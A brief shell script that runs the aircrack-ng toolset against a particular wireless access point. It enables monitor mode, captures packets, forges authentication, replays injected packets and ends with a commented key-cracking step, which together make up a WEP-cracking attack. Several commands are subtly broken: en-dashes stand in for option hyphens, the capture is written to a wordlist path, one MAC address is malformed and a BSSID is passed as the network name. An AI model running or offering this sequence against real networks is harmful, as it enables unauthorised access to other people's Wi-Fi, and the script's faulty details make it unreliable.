#!/bin/sh
airmon-ng start wlan0
airodump-ng –c 6 --bssid 68:8F:2E:02:CB:88 -w /installs/apps/wordlists/10000.txt mon0
macchanger --show mon0
aireplay-ng -1 0 -a 68:8F:2E:02:CB:88 -h 90-61-AE-75-FB-CF-3A-30-00-00-00-00-00-00-00-00 -e 68:8F:2E:02:CB:88  mon0
aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b 68:8F:2E:02:CB:88  -h 90-61-AE-75-FB-CF-3A-30-00-00-00-00-00-00-00-00 mon0
#aircrack-ng –b <BSSID> <PCAP_of_FileName>
